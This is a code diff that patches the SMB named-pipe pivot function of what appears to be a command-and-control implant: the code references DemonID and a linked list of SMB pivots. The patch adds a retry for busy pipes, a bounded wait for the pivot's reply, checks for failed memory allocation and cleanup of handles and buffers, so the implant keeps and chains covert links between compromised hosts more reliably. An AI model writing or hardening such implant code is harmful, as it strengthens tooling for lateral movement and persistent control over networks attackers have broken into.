@@ -32,17 +32,26 @@ BOOL PivotAdd( BUFFER NamedPipe, PVOID* Output, PDWORD BytesSize )
 
     if ( Handle == INVALID_HANDLE_VALUE )
     {
-        PRINTF( "CreateFileW: Failed[%d]\n", NtGetLastError() );
-        return FALSE;
-    }
-
-    if ( NtGetLastError() == ERROR_PIPE_BUSY )
-    {
-        if ( ! Instance->Win32.WaitNamedPipeW( NamedPipe.Buffer, 5000 ) )
+        /* all pipe instances are busy: wait for one to free up and retry once */
+        if ( NtGetLastError() == ERROR_PIPE_BUSY )
         {
+            if ( ! Instance->Win32.WaitNamedPipeW( NamedPipe.Buffer, 5000 ) )
+            {
+                return FALSE;
+            }
+
+            Handle = Instance->Win32.CreateFileW( NamedPipe.Buffer, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL );
+        }
+
+        if ( Handle == INVALID_HANDLE_VALUE )
+        {
+            PRINTF( "CreateFileW: Failed[%d]\n", NtGetLastError() );
             return FALSE;
         }
     }
+
+    /* bound the wait for the pivot to answer: never block the dispatch thread forever */
+    DWORD Timeout = 0;
 
     do
     {
@@ -54,6 +63,14 @@ BOOL PivotAdd( BUFFER NamedPipe, PVOID* Output, PDWORD BytesSize )
                 PRINTF( "BytesSize => %d\n", *BytesSize );
 
                 *Output = Instance->Win32.LocalAlloc( LPTR, *BytesSize );
+
+                if ( ! *Output )
+                {
+                    PRINTF( "LocalAlloc: Failed[%d]\n", NtGetLastError() );
+                    SysNtClose( Handle );
+                    return FALSE;
+                }
+
                 MemSet( *Output, 0, *BytesSize );
 
                 if ( Instance->Win32.ReadFile( Handle, *Output, *BytesSize, BytesSize, NULL ) )
@@ -65,8 +82,21 @@ BOOL PivotAdd( BUFFER NamedPipe, PVOID* Output, PDWORD BytesSize )
                 {
                     PRINTF( "ReadFile: Failed[%d]\n", NtGetLastError() );
                     SysNtClose( Handle );
+                    Instance->Win32.LocalFree( *Output );
+                    *Output = NULL;
                     return FALSE;
                 }
+            }
+
+            /* nothing to read yet: don't spin at full speed.
+             * bail out after ~5 seconds of silence (same bound as WaitNamedPipeW above) */
+            SharedSleep( 10 );
+
+            if ( ++Timeout >= 500 )
+            {
+                PUTS( "PivotAdd: Timed out waiting for pivot response" )
+                SysNtClose( Handle );
+                return FALSE;
             }
         }
         else
@@ -81,12 +111,33 @@ BOOL PivotAdd( BUFFER NamedPipe, PVOID* Output, PDWORD BytesSize )
     {
         PRINTF( "Pivot :: Output[%p] Size[%d]\n", *Output, *BytesSize )
 
-        Data                  = Instance->Win32.LocalAlloc( LPTR, sizeof( PIVOT_DATA ) );
+        Data = Instance->Win32.LocalAlloc( LPTR, sizeof( PIVOT_DATA ) );
+
+        if ( ! Data )
+        {
+            PRINTF( "LocalAlloc: Failed[%d]\n", NtGetLastError() );
+            SysNtClose( Handle );
+            Instance->Win32.LocalFree( *Output );
+            *Output = NULL;
+            return FALSE;
+        }
+
         Data->Handle          = Handle;
         Data->Next            = NULL;
         Data->DemonID         = PivotParseDemonID( *Output, *BytesSize );
         Data->PipeName.Buffer = Instance->Win32.LocalAlloc( LPTR, NamedPipe.Length );
         Data->PipeName.Length = NamedPipe.Length;
+
+        if ( ! Data->PipeName.Buffer )
+        {
+            PRINTF( "LocalAlloc: Failed[%d]\n", NtGetLastError() );
+            SysNtClose( Handle );
+            Instance->Win32.LocalFree( Data );
+            Instance->Win32.LocalFree( *Output );
+            *Output = NULL;
+            return FALSE;
+        }
+
         MemCopy( Data->PipeName.Buffer, NamedPipe.Buffer, NamedPipe.Length );
 
         if ( ! Instance->SmbPivots )
